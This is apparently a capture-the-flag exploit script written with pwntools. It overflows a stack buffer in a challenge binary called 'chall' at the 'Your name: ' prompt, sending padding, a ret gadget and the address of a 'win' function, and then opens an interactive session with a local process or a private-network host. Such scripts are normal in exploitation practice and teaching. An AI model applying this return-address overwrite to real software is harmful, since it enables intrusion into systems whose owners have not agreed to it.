from pwn import *

context.binary = elf = ELF("./chall")
context.log_level = "info"

OFFSET  = 0x40 + 8 
WIN     = 0x401186
RET     = 0x40126e 

HOST, PORT = "192.168.64.203", 5002

def start():
    return process(elf.path) if args.LOCAL else remote(HOST, PORT)

io = start()

payload = flat({
    OFFSET: [RET, WIN]
})

io.sendlineafter(b"Your name: ", payload)
io.interactive()
